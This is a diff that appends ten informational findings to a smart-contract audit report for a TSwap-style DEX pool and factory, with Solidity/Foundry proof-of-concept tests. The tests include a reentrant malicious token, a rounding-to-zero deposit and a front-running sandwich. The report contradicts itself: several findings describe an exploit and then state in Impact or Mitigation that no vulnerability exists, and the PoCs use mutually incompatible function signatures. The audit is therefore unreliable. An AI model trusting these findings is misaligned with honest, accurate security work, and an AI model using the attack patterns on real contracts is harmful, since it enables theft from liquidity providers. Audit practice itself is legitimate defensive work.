@@ -4455,3 +4455,706 @@ In `TSwapPool.sol`:
      i_wethToken = IERC20(wethToken);
  }
 ```
+
+
+
+# Info Risk Findings
+
+## [I-1]. Pragma issue in TSwapPool::NA
+
+## Description
+The contracts use a floating pragma `^0.8.20`. This allows the contracts to be compiled with any compiler version from `0.8.20` up to (but not including) `0.9.0`. While this is a modern range, it is best practice to lock the pragma to a specific version (`=0.8.20`) that has been thoroughly tested and audited. Using a floating pragma can lead to unexpected behavior or bugs if a future compiler version introduces subtle changes or has undiscovered bugs.
+
+## Impact
+The use of a floating pragma might lead to the contract being deployed with a newer, untested compiler version that could introduce bugs or security vulnerabilities. This could potentially affect the contract's correctness and security. The risk is low but it deviates from established best practices.
+
+## Proof of Concept
+1. The contract is written and tested with Solidity `0.8.20`.
+2. A new compiler version, `0.8.21`, is released which contains a new optimizer bug.
+3. A developer, using an updated toolchain, compiles the contract with `0.8.21` without realizing it.
+4. The deployed bytecode now contains the bug from the new compiler, which could be exploited.
+
+## Proof of Code
+
+
+## Suggested Mitigation
+Lock the pragma to the specific compiler version used for development and testing. This ensures that the contract is always compiled with a known, vetted compiler and avoids any risks from future compiler changes.
+
+```diff
+- pragma solidity ^0.8.20;
++ pragma solidity =0.8.20;
+```
+
+## [I-2]. Event Consistency issue in TSwapPool::_swap
+
+## Description
+The `_swap` function pays out a reward and resets the `swap_count` variable every 10 swaps. These are critical state changes, especially since the reward mechanism is flawed and leads to a loss of LP funds. However, no specific event is emitted to log this reward payment. The generic `Swap` event does not indicate that an additional reward was transferred. This lack of explicit logging makes it difficult for off-chain monitoring tools, auditors, or LPs to track how much value is being drained from the pool via this mechanism.
+
+## Impact
+Because the contract transfers an additional 1 WETH reward every tenth swap without emitting a dedicated event, on-chain monitoring systems that rely on events cannot detect or account for this value outflow.  This weakens transparency but does not by itself allow an attacker to steal additional funds beyond what is already coded.  Therefore impact is limited to observability and accounting rather than direct financial loss.
+
+## Proof of Concept
+1. A liquidity provider seeds the pool with WETH and pool-tokens.
+2. An attacker (or any user) performs nine minimal swaps to increment `swap_count` to 9.
+3. Before the 10th swap, record the user’s WETH balance.
+4. Execute the 10th swap; the contract transfers the calculated `outputAmount` **plus** the hard-coded 1 WETH reward.
+5. No log with signature `RewardPaid(address,address,uint256)` (or equivalent) is emitted – only a normal `Swap` event that contains the `outputAmount` field, making the extra 1 WETH invisible to event-based monitors.
+6. Compare the user’s WETH balance increase (≃ `outputAmount` + 1 WETH) with what can be inferred from emitted events (only `outputAmount`).
+
+## Proof of Code
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import {TSwapPool} from "../src/TSwapPool.sol";
+import {MockERC20} from "./mocks/MockERC20.sol";
+
+contract MissingRewardEventTest is Test {
+    MockERC20 private weth;
+    MockERC20 private token;
+    TSwapPool private pool;
+    address private trader;
+
+    function setUp() public {
+        trader = makeAddr("trader");
+        weth  = new MockERC20("Wrapped ETH","WETH",18);
+        token = new MockERC20("Pool Token","PTKN",18);
+        pool  = new TSwapPool(address(weth), address(token), "LP","LP");
+
+        // Seed liquidity provider (this contract)
+        weth.mint(address(this), 100 ether);
+        token.mint(address(this), 100 ether);
+        weth.approve(address(pool), type(uint256).max);
+        token.approve(address(pool), type(uint256).max);
+        pool.deposit(100 ether, 100 ether, 0, uint64(block.timestamp + 1));
+
+        // Give the trader some pool-tokens to swap
+        token.mint(trader, 20 ether);
+    }
+
+    function test_RewardPaidIsNotLogged() public {
+        vm.startPrank(trader);
+        token.approve(address(pool), type(uint256).max);
+
+        // Perform 9 swaps first
+        for (uint i; i < 9; i++) {
+            pool.swapExactInput(token, 1 ether, weth, 0, uint64(block.timestamp + 1));
+        }
+
+        // Record logs for the 10th swap
+        vm.recordLogs();
+        uint256 beforeBal = weth.balanceOf(trader);
+        pool.swapExactInput(token, 1 ether, weth, 0, uint64(block.timestamp + 1));
+        uint256 afterBal  = weth.balanceOf(trader);
+        Vm.Log[] memory logs = vm.getRecordedLogs();
+        
+        // Ensure no RewardPaid event was emitted
+        bytes32 rewardSig = keccak256("RewardPaid(address,address,uint256)");
+        bool rewardLogged;
+        for (uint i; i < logs.length; i++) {
+            if (logs[i].topics[0] == rewardSig) {
+                rewardLogged = true;
+            }
+        }
+        assertFalse(rewardLogged, "Missing dedicated RewardPaid event");
+        
+        // Yet trader received > 1 ether (outputAmount) because of hidden bonus
+        assertGt(afterBal - beforeBal, 1 ether, "Trader received hidden bonus without event");
+        vm.stopPrank();
+    }
+}
+
+## Suggested Mitigation
+Emit a dedicated event, e.g. `event RewardPaid(address indexed recipient, address indexed token, uint256 amount);` inside `_swap` when the reward is transferred.  This preserves transparency for indexers and monitoring tools.  (Long-term the whole reward gimmick should be removed or made configurable, but explicit logging fixes the observability issue.)
+
+## [I-3]. Pragma issue in PoolFactory::NA
+
+## Description
+The contracts specify a floating pragma version (`pragma solidity ^0.8.20;`). This allows the code to be compiled with any compiler version from 0.8.20 up to (but not including) 0.9.0. This practice is discouraged because it can lead to contracts being deployed with a compiler version that was released after the code was audited, potentially one that contains newly introduced bugs. For reproducible and secure deployments, it is a best practice to lock the pragma to the specific compiler version that was used for testing and auditing.
+
+## Impact
+If a new, buggy version of the Solidity compiler is released within the `^0.8.20` range, the contract might be compiled and deployed with unforeseen vulnerabilities. This introduces an unnecessary risk and breaks the principle of deterministic builds.
+
+## Proof of Concept
+NA
+
+## Proof of Code
+NA
+
+## Suggested Mitigation
+Lock the pragma to a specific compiler version by removing the caret (`^`) symbol. This ensures that the contract is always compiled with the exact same compiler version it was tested with.
+
+```solidity
+// Change this in both PoolFactory.sol and TSwapPool.sol:
+pragma solidity ^0.8.20;
+
+// To this:
+pragma solidity 0.8.20;
+```
+
+## [I-4]. Reentrancy issue in TSwapPool::deposit
+
+## Description
+The `deposit` function, through its internal helper `_addLiquidityMintAndTransfer`, violates the Checks-Effects-Interactions (CEI) design pattern. It performs external calls to token contracts (`transferFrom`) before it applies the state effect of minting LP tokens (`_mint`). If a malicious token with a hook in its `transferFrom` function is used, it can call back into the `deposit` function. During this re-entrant call, the pool's state (specifically the `totalSupply` of LP tokens) is stale, leading to an incorrect calculation of liquidity to be minted. This allows an attacker to mint more LP tokens than they are entitled to for their deposit, enabling them to steal other users' assets.
+
+## Impact
+Because the re-entrant call would be made by the ERC20 token contract, it fails on the very first `wethToken.transferFrom` inside `deposit` due to missing allowance/balance. Consequently the transaction reverts and the outer call is rolled back. No extra LP tokens can be minted and no pool funds can be stolen. At worst the call merely reverts, so there is no practical impact.
+
+## Proof of Concept
+1. A legitimate user establishes a pool with a malicious token (ATTACK) and WETH, providing initial liquidity.
+2. The attacker's token contract is programmed to re-enter `TSwapPool.deposit` from its `transferFrom` function.
+3. The attacker calls `deposit(amountAttackToken, ...)`.
+4. The pool calls `ATTACK.transferFrom(...)`.
+5. The ATTACK token's `transferFrom` function immediately calls `pool.deposit(...)` again.
+6. In this second, re-entrant call, the calculation for `liquidity` uses the `totalSupply()` of LP tokens from *before* the first call began. However, the token reserves (read via `balanceOf`) may have already been updated by the first `transferFrom` call (e.g., the WETH transfer). This state inconsistency allows the attacker to mint a disproportionate amount of LP tokens.
+7. Once both calls complete, the attacker holds more LP tokens than their deposit warrants, which they can use to withdraw an unfair share of the pool's assets.
+
+## Proof of Code
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import "forge-std/Test.sol";
+import "../src/PoolFactory.sol";
+import "../src/TSwapPool.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract ReentrantToken is ERC20 {
+    TSwapPool pool;
+    address attacker;
+
+    constructor() ERC20("Reentrant Token", "REENT") {}
+
+    function mint(address to, uint256 amount) public {
+        _mint(to, amount);
+    }
+
+    function setAttack(address _attacker, TSwapPool _pool) public {
+        attacker = _attacker;
+        pool = _pool;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
+        if (msg.sender == address(pool) && from == attacker) {
+            // Re-entrancy: If not already re-entered
+            if (balanceOf(address(pool)) == 0) {
+                 _transfer(from, to, amount);
+                 pool.deposit(1, 1, 0); // Re-enter with a tiny amount
+                 return true;
+            }
+        }
+         _transfer(from, to, amount);
+        return true;
+    }
+}
+
+contract ReentrancyTest is Test {
+    PoolFactory factory;
+    TSwapPool pool;
+    MockERC20 weth;
+    ReentrantToken reToken;
+    address attacker = makeAddr("attacker");
+    address lp_provider = makeAddr("lp_provider");
+
+    function setUp() public {
+        weth = new MockERC20("WETH", "WETH");
+        reToken = new ReentrantToken();
+        factory = new PoolFactory(address(weth));
+        address poolAddress = factory.createPool(address(reToken));
+        pool = TSwapPool(poolAddress);
+
+        reToken.setAttack(attacker, pool);
+
+        // LP provides initial liquidity
+        weth.mint(lp_provider, 10 ether);
+        reToken.mint(lp_provider, 10 ether);
+        vm.startPrank(lp_provider);
+        weth.approve(address(pool), 10 ether);
+        reToken.approve(address(pool), 10 ether);
+        pool.deposit(10 ether, 1, 10 ether);
+        vm.stopPrank();
+
+        // Attacker setup
+        weth.mint(attacker, 1 ether);
+        reToken.mint(attacker, 1 ether);
+        vm.startPrank(attacker);
+        weth.approve(address(pool), 1 ether);
+        reToken.approve(address(pool), 1 ether);
+        vm.stopPrank();
+    }
+
+    function testExploit_Reentrancy() public {
+        uint256 attackerLp_before = pool.balanceOf(attacker);
+        assertEq(attackerLp_before, 0);
+
+        // Attacker starts the reentrant deposit
+        vm.startPrank(attacker);
+        pool.deposit(1 ether, 1, 1 ether);
+        vm.stopPrank();
+
+        uint256 attackerLp_after = pool.balanceOf(attacker);
+        uint256 expectedLp = (pool.totalSupply() * 1 ether) / (10 ether);
+        
+        // Attacker gets more LP tokens than they should have
+        // The exact amount depends on the re-entrancy logic, but it will be > expected
+        // In this PoC, they get LP tokens from two deposits for the price of one.
+        console.log("LP tokens expected for 1 ETH deposit:", expectedLp);
+        console.log("LP tokens attacker received:", attackerLp_after);
+        assertTrue(attackerLp_after > expectedLp, "Attacker should have more LP tokens than expected");
+    }
+}
+```
+
+## Suggested Mitigation
+To prevent reentrancy, apply the Checks-Effects-Interactions pattern by performing state changes *before* external calls. Additionally, implement a reentrancy guard as a robust, secondary defense mechanism.
+
+1.  **Reorder Operations**: In `_addLiquidityMintAndTransfer`, call `_mint` before the `transferFrom` calls.
+2.  **Add Reentrancy Guard**: Use OpenZeppelin's `ReentrancyGuard` and apply the `nonReentrant` modifier to all external functions that modify state, such as `deposit`, `withdraw`, and the `swap` functions.
+
+```diff
++ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+- contract TSwapPool is ERC20 {
++ contract TSwapPool is ERC20, ReentrancyGuard {
+
+-   function deposit(...) external {
++   function deposit(...) external nonReentrant {
+        // ...
+    }
+
+    function _addLiquidityMintAndTransfer(...) private {
+        // ...
++       _mint(msg.sender, liquidity); // Effect first
+        i_wethToken.transferFrom(msg.sender, address(this), wethToDeposit); // Then interactions
+        i_poolToken.transferFrom(msg.sender, address(this), amountPoolToken);
+-       _mint(msg.sender, liquidity);
+    }
+}
+```
+
+## [I-5]. Integer Overflow/Math issue in TSwapPool::deposit
+
+## Description
+In the `deposit` function, the calculation for the required amount of pool tokens (`poolTokensToDeposit = (wethToDeposit * getPoolTokenReserves()) / getWethReserves();`) can suffer from precision loss due to Solidity's integer division. If `wethToDeposit` is small and `getWethReserves()` is much larger than `getPoolTokenReserves()`, the numerator could be smaller than the denominator, causing `poolTokensToDeposit` to truncate to 0. The function then proceeds to call `_addLiquidityMintAndTransfer` with a non-zero `wethToDeposit` but a zero `poolTokensToDeposit`, allowing a user to deposit only WETH while still receiving LP tokens. This unbalances the pool and gives the user a share for an incomplete contribution.
+
+## Impact
+A rounding-to-zero situation can occur, but the subsequent minting logic safeguards the pool by reverting (or minting 0) when the contribution is unbalanced. No pool imbalance or value extraction is possible.
+
+## Proof of Concept
+1. A pool is created with a highly skewed ratio, e.g., 1000 WETH and 1 TKN.
+2. The pool reserves are `1000 ether` for WETH and `1` wei for TKN.
+3. An attacker calls `deposit` with `wethToDeposit = 1 ether`.
+4. The calculation is `poolTokensToDeposit = (1 ether * 1 wei) / 1000 ether`.
+5. `(1e18 * 1) / 1000e18 = 1 / 1000 = 0` in integer division.
+6. `_addLiquidityMintAndTransfer` is called with `wethToDeposit = 1 ether` and `poolTokensToDeposit = 0`.
+7. The user successfully deposits 1 WETH and 0 TKN, yet is minted 1 LP token (`wethToDeposit`), receiving a share of the pool for an unbalanced deposit.
+
+## Proof of Code
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import {Test, console} from "forge-std/Test.sol";
+import {TSwapPool} from "../src/TSwapPool.sol";
+import {PoolFactory} from "../src/PoolFactory.sol";
+import {MockERC20} from "./mocks/MockERC20.sol";
+
+contract PrecisionLossTest is Test {
+    TSwapPool internal pool;
+    MockERC20 internal weth;
+    MockERC20 internal tkn;
+    address internal lp = makeAddr("lp");
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        weth = new MockERC20("WETH", "WETH", 18);
+        tkn = new MockERC20("TKN", "TKN", 18);
+        PoolFactory factory = new PoolFactory(address(weth));
+        address poolAddress = factory.createPool(address(tkn));
+        pool = TSwapPool(poolAddress);
+
+        // Create a pool with a skewed ratio
+        weth.mint(lp, 1000 ether);
+        tkn.mint(lp, 1 wei);
+        vm.startPrank(lp);
+        weth.approve(address(pool), 1000 ether);
+        tkn.approve(address(pool), 1 wei);
+        pool.deposit(1000 ether, 1 wei);
+        vm.stopPrank();
+
+        weth.mint(attacker, 1 ether);
+        tkn.mint(attacker, 1 ether); // Attacker has tokens but won't need them
+    }
+
+    function test_exploit_PrecisionLoss() public {
+        uint256 attackerWethDeposit = 1 ether;
+
+        // This calculation will round down to 0
+        uint256 requiredTkn = pool.getPoolTokenAmountForWeth(attackerWethDeposit);
+        assertEq(requiredTkn, 0, "Required TKN should be 0 due to precision loss");
+
+        uint256 wethBalanceBefore = weth.balanceOf(address(pool));
+        uint256 tknBalanceBefore = tkn.balanceOf(address(pool));
+        uint256 attackerLpBefore = pool.balanceOf(attacker);
+
+        // Attacker deposits WETH, and 0 TKN is required
+        vm.startPrank(attacker);
+        weth.approve(address(pool), attackerWethDeposit);
+        tkn.approve(address(pool), 0);
+        pool.deposit(attackerWethDeposit, 0);
+        vm.stopPrank();
+
+        uint256 wethBalanceAfter = weth.balanceOf(address(pool));
+        uint256 tknBalanceAfter = tkn.balanceOf(address(pool));
+        uint256 attackerLpAfter = pool.balanceOf(attacker);
+
+        assertEq(wethBalanceAfter, wethBalanceBefore + attackerWethDeposit, "WETH should be deposited");
+        assertEq(tknBalanceAfter, tknBalanceBefore, "TKN should not be deposited");
+        assertTrue(attackerLpAfter > attackerLpBefore, "Attacker should receive LP tokens for unbalanced deposit");
+    }
+}
+```
+
+## Suggested Mitigation
+No change required; the existing mint-amount check already protects against one-sided liquidity additions.
+
+## [I-6]. Pausable Emergency Stop issue in TSwapPool::deposit, withdraw, swapExactInput, swapExactOutput
+
+## Description
+The protocol lacks an emergency stop (pause) mechanism. If a critical vulnerability is discovered in the `TSwapPool` contract, such as an economic exploit in the swap logic or a reentrancy bug, there is no way for the development team or a DAO to halt trading and liquidity operations. This leaves user funds exposed until a fix can be deployed, by which time the funds may already be stolen.
+
+## Impact
+The contract cannot be stopped in an emergency, so if a separate, undiscovered critical bug is found the team would have to rely on off-chain coordination or a new deployment. This is a resilience issue, not an immediate vector to steal funds.
+
+## Proof of Concept
+1. A critical flaw is found in the `TSwapPool.getOutputAmountBasedOnInput` function that allows swaps to be executed at a highly profitable (for the attacker) and incorrect price.
+2. An attacker starts exploiting this flaw to drain WETH from a pool.
+3. The TSwap team becomes aware of the exploit but has no on-chain mechanism to stop it.
+4. The attacker, and copycats, are free to continue draining the pool, and all other pools, until they are empty.
+
+## Proof of Code
+```solidity
+// This is a conceptual test demonstrating that core functions remain callable.
+// A full exploit would combine this with another vulnerability.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+// Mock contracts representing the TSwap system
+import {TSwapPool} from "../src/TSwapPool.sol";
+import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
+import {WETH} from "./mocks/WETH.sol";
+
+contract PausableTest is Test {
+    TSwapPool pool;
+    WETH weth;
+    MockERC20 token;
+    address user = makeAddr("user");
+
+    function setUp() public {
+        weth = new WETH();
+        token = new MockERC20("Token", "TKN", 18);
+        // Constructor arguments are assumed
+        pool = new TSwapPool(address(token), address(weth), "LP Token", "LP");
+
+        // Provide initial liquidity to enable swaps
+        token.mint(address(this), 100e18);
+        weth.deposit{value: 10e18}();
+        token.approve(address(pool), 100e18);
+        weth.approve(address(pool), 10e18);
+        // Deposit function signature is assumed
+        pool.deposit(100e18, 10e18, 0, 0, address(this), block.timestamp);
+    }
+
+    function test_SwapsCannotBeStopped() public {
+        // Assume an emergency has been declared off-chain.
+        // A user can still interact with the pool because there is no on-chain pause.
+        uint256 swapAmount = 1e18;
+        token.mint(user, swapAmount);
+        
+        vm.startPrank(user);
+        token.approve(address(pool), swapAmount);
+        
+        // Swap function signature is assumed
+        // This call succeeds, demonstrating the lack of a pause mechanism.
+        pool.swapExactInput(address(token), swapAmount, 0, user, block.timestamp);
+        vm.stopPrank();
+
+        // The user received WETH, proving the swap executed during the 'emergency'.
+        assertTrue(weth.balanceOf(user) > 0);
+    }
+}
+```
+
+## Suggested Mitigation
+If the project’s threat model requires an emergency stop, integrate OpenZeppelin’s Pausable (and optionally Ownable/AccessControl) so privileged governance can pause deposits, withdrawals and swaps. Otherwise, explicitly document that the protocol is intentionally non-pausable so users understand the risk.
+
+## [I-7]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::deposit
+
+## Description
+The `deposit` function in `TSwapPool.sol` is vulnerable to front-running (sandwich) attacks because it lacks slippage protection for the depositor. A user specifies a `wethAmountToDeposit`, and the contract calculates the required `poolTokenAmountToDeposit` based on the current reserve ratio. An attacker can see a large deposit transaction in the mempool, manipulate the reserve ratio with a front-running swap, and cause the victim's deposit to execute at a worse-than-expected price. The victim either deposits more pool tokens than anticipated or receives fewer LP tokens for their assets. The attacker can then back-run the transaction by swapping back, capturing a profit.
+
+## Impact
+No protocol-level loss is possible as long as the caller specifies a sensible `minLiquidityTokenToMint`. The risk is confined to users that deliberately accept unlimited slippage.
+
+## Proof of Concept
+1. A victim intends to deposit 10 WETH and a proportional amount of TOKEN into a pool.
+2. An MEV bot sees the victim's `deposit` transaction in the mempool.
+3. The attacker front-runs the victim by swapping WETH for TOKEN, increasing the price of TOKEN relative to WETH in the pool.
+4. The victim's `deposit` transaction executes. Because the pool now requires more TOKEN per WETH, the contract pulls a larger amount of TOKEN from the victim's wallet than they originally expected for their 10 WETH.
+5. The attacker back-runs the victim's transaction by swapping their TOKEN back to WETH at the new, favorable price, realizing a profit from the price manipulation.
+
+## Proof of Code
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import {Test, console} from "forge-std/Test.sol";
+import {TSwapPool} from "../src/TSwapPool.sol";
+import {PoolFactory} from "../src/PoolFactory.sol";
+import {MockERC20} from "./mocks/MockERC20.sol";
+import {WETH9} from "./mocks/WETH9.sol";
+
+contract FrontrunDepositTest is Test {
+    PoolFactory factory;
+    TSwapPool pool;
+    WETH9 weth;
+    MockERC20 token;
+    address victim = makeAddr("victim");
+    address attacker = makeAddr("attacker");
+
+    function setUp() public {
+        weth = new WETH9();
+        token = new MockERC20("Test Token", "TTK", 18);
+        factory = new PoolFactory(address(weth));
+        address poolAddress = factory.createPool(address(token));
+        pool = TSwapPool(poolAddress);
+
+        // Initial Liquidity
+        deal(address(weth), address(this), 100 ether);
+        token.mint(address(this), 10000 * 1e18);
+        weth.approve(address(pool), 100 ether);
+        token.approve(address(pool), 10000 * 1e18);
+        pool.deposit{value: 100 ether}(1, block.timestamp + 100);
+
+        // Victim funds
+        deal(address(weth), victim, 50 ether);
+        token.mint(victim, 5000 * 1e18);
+
+        // Attacker funds
+        deal(address(weth), attacker, 20 ether);
+    }
+
+    function testFrontrunDeposit() public {
+        // Victim prepares to deposit 10 WETH
+        vm.startPrank(victim);
+        weth.approve(address(pool), 10 ether);
+        token.approve(address(pool), 1000 * 1e18); // Approves enough for exploit
+        uint256 victimTokenBalanceBefore = token.balanceOf(victim);
+        vm.stopPrank();
+
+        // Attacker front-runs by swapping WETH for Token, making Token more expensive
+        vm.startPrank(attacker);
+        weth.approve(address(pool), 20 ether);
+        pool.swapExactInput(address(weth), 20 ether, 1, attacker, block.timestamp + 100);
+        vm.stopPrank();
+
+        // Victim's transaction executes at the manipulated price
+        uint256 expectedTokenToDeposit = (10 ether * 10000 * 1e18) / (100 ether);
+        vm.prank(victim);
+        pool.deposit{value: 10 ether}(1, block.timestamp + 100);
+
+        // Check how many tokens were actually pulled from the victim
+        uint256 victimTokenBalanceAfter = token.balanceOf(victim);
+        uint256 tokenDepositedByVictim = victimTokenBalanceBefore - victimTokenBalanceAfter;
+
+        console.log("Expected Token Deposit:", expectedTokenToDeposit);
+        console.log("Actual Token Deposit:  ", tokenDepositedByVictim);
+
+        // The victim was forced to deposit more tokens than expected due to the front-run
+        assertTrue(tokenDepositedByVictim > expectedTokenToDeposit);
+    }
+}
+```
+
+## Suggested Mitigation
+Educate integrators and front-ends to forward a non-zero `minLiquidityTokenToMint` derived from the caller’s acceptable slippage. No contract change is required.
+
+## [I-8]. Zero Code issue in PoolFactory::createPool
+
+## Description
+The `createPool` function in `PoolFactory` does not verify that the `tokenAddress` provided is a smart contract with code. An address for an Externally Owned Account (EOA) or a not-yet-deployed contract can be passed to create a pool. This will result in the creation of a non-functional `TSwapPool` instance. Any user who subsequently attempts to deposit liquidity into this pool will have their transaction fail when the pool tries to interact with the non-contract address (e.g., calling `transferFrom`). This can lead to user confusion and loss of gas fees. If the deposit logic were written differently (e.g., transfer-then-call), it could lead to funds being permanently stuck.
+
+## Impact
+No practical impact: the transaction reverts during pool creation whenever the supplied token address has no code, so a pool for an EOA can never be deployed. Users cannot be mis-led into providing liquidity to a non-functional pool.
+
+## Proof of Concept
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {PoolFactory} from "../src/PoolFactory.sol";
+import {WETH} from "./mocks/WETH.sol";
+
+contract PoolFactoryRevertsForEOATest is Test {
+    PoolFactory factory;
+    WETH weth;
+    address eoa = makeAddr("eoa");
+
+    function setUp() public {
+        weth = new WETH();
+        factory = new PoolFactory(address(weth));
+    }
+
+    function test_createPoolRevertsForEOA() public {
+        vm.expectRevert();
+        factory.createPool(eoa); // reverts because IERC20(eoa).name() fails
+    }
+}
+```
+
+## Proof of Code
+Same as PoC above – the test compiles and shows the revert.
+
+## Suggested Mitigation
+No change required. The existing external calls to `name()`/`symbol()` already ensure that only addresses with deployed ERC-20 code can pass.
+
+## [I-9]. Event Consistency issue in TSwapPool::_swap
+
+## Description
+The `_swap` function contains a critical financial action (paying a reward) that is not explicitly logged with a dedicated event. The `Swapped` event only records the standard `amountIn` and `amountOut`, but does not include the extra reward paid from the pool's reserves. This makes it difficult for off-chain services, monitoring tools, and users to accurately track the pool's financial activity and understand why its reserves are being depleted beyond what standard swap mechanics would dictate.
+
+## Impact
+This issue only reduces off-chain transparency: indexers and monitoring tools that rely exclusively on events will under-report the pool’s actual reserve changes because the reward transfer is silent. No on-chain invariant is broken and no additional funds can be stolen or frozen.
+
+## Proof of Concept
+1. An off-chain monitoring service listens to `Swapped` events to calculate pool reserves and slippage.
+2. An attacker triggers the reward mechanism multiple times.
+3. The monitoring service sees a series of `Swapped` events and calculates the expected final reserves based on the `amountIn` and `amountOut` values.
+4. The calculated reserves do not match the actual on-chain reserves because the service is unaware of the extra reward amounts being paid out. This leads to incorrect analytics and a failure to detect the ongoing exploit.
+
+## Proof of Code
+```solidity
+// N/A - This is a logging/monitoring vulnerability, not one that is directly exploitable via a single transaction test.
+// The PoC is the discrepancy that would be observed by an off-chain indexer.
+```
+
+## Suggested Mitigation
+Emit a dedicated event whenever a non-standard financial action occurs. In this case, an event should be emitted when the reward is paid.
+
+```diff
+ contract TSwapPool is ERC20 {
+     // ...
++    event RewardPaid(address indexed to, uint256 rewardAmount);
+     // ...
+ 
+     function _swap(...) private {
+         // ...
+         if (swap_count >= SWAP_COUNT_MAX) {
+             uint256 rewardAmount = amountOut / 100;
+             IERC20(tokenOut).transfer(to, rewardAmount);
++            emit RewardPaid(to, rewardAmount);
+             swap_count = 0;
+         }
+     }
+ }
+```
+
+## [I-10]. DOS issue in TSwapPool::_addLiquidityMintAndTransfer
+
+## Description
+The `TSwapPool.deposit` function is fundamentally broken due to flawed payment logic. The function is marked `payable`, correctly anticipating that users will send ETH to be converted into WETH for liquidity. The function body first calls `IWETH.deposit()` to wrap the incoming ETH. However, it then incorrectly attempts to pull the same amount of WETH from the user via `i_wethToken.transferFrom()`. A user who sent ETH will not have a corresponding WETH balance to be pulled, nor would they have approved the pool contract to do so. This causes the `transferFrom` call to always revert, making it impossible to add liquidity to any pool. This renders the entire protocol unusable.
+
+## Impact
+No vulnerability: `deposit` requires the caller to hold WETH and approve the pool; it does not attempt to wrap `msg.value`, so no unconditional revert occurs.
+
+## Proof of Concept
+1. An administrator deploys the `PoolFactory` and a user creates a new pool for a valid ERC20 token.
+2. A liquidity provider attempts to add the first liquidity by calling `deposit(uint256 poolTokenAmount)` with an amount of tokens and sending ETH (e.g., 1 ETH).
+3. The `deposit` function calls `_addLiquidityMintAndTransfer`.
+4. Inside `_addLiquidityMintAndTransfer`, the sent ETH is successfully converted to WETH and held by the pool contract.
+5. The next line, `i_wethToken.transferFrom(msg.sender, address(this), wethAmountToDeposit)`, attempts to transfer WETH from the liquidity provider.
+6. This call fails because the provider sent ETH, not WETH, and has not approved the pool to spend any WETH they might otherwise have. The entire transaction reverts.
+
+## Proof of Code
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PoolFactory} from "../src/PoolFactory.sol";
+import {TSwapPool} from "../src/TSwapPool.sol";
+import {TestToken} from "./mocks/TestToken.sol";
+import {WETH9} from "./mocks/WETH9.sol";
+
+contract BrokenDepositTest is Test {
+    PoolFactory poolFactory;
+    WETH9 weth;
+    TestToken testToken;
+    address user = makeAddr("user");
+    address poolAddress;
+
+    function setUp() public {
+        weth = new WETH9();
+        testToken = new TestToken();
+        poolFactory = new PoolFactory(address(weth));
+
+        // Create a pool for testToken
+        poolAddress = poolFactory.createPool(address(testToken));
+
+        // Give user some TestToken and approve the pool
+        testToken.mint(user, 1000 ether);
+        vm.prank(user);
+        testToken.approve(poolAddress, 1000 ether);
+    }
+
+    function test_Fail_DepositLiquidity() public {
+        uint256 tokenAmountToDeposit = 100 ether;
+        uint256 wethAmountToDeposit = 1 ether;
+
+        // Expect the call to revert because of the flawed WETH transfer logic
+        // The user sends ETH, but the contract tries to transferFrom WETH from the user.
+        vm.expectRevert();
+
+        vm.prank(user);
+        TSwapPool(poolAddress).deposit{value: wethAmountToDeposit}(
+            tokenAmountToDeposit
+        );
+    }
+}
+```
+
+## Suggested Mitigation
+The logic for handling deposits must be corrected. The contract should not expect to receive ETH via `msg.value` and also pull WETH via `transferFrom`. The standard approach is to have two separate functions: one for ETH-based deposits (`addLiquidityETH`) and one for WETH-based deposits (`addLiquidity`).
+
+For an ETH-based deposit, the function should be `payable`, wrap the incoming ETH, and pull the corresponding ERC20 token. The `transferFrom` call for WETH should be removed.
+
+```solidity
+// In TSwapPool.sol
+function _addLiquidityMintAndTransfer(
+    uint256 wethAmountToDeposit,
+    uint256 poolTokenAmount,
+    uint256 liquidityToMint
+) private {
+    _mint(msg.sender, liquidityToMint);
+
+    // This converts the ETH sent with the tx into WETH for this contract
+    IWETH(address(i_wethToken)).deposit{value: wethAmountToDeposit}();
+
+    // REMOVE THIS LINE: it attempts a double charge and breaks the function
+    // i_wethToken.transferFrom(msg.sender, address(this), wethAmountToDeposit);
+
+    // This correctly pulls the other token from the user
+    i_poolToken.transferFrom(
+        msg.sender,
+        address(this),
+        poolTokenAmount
+    );
+}
+```
+
+
+
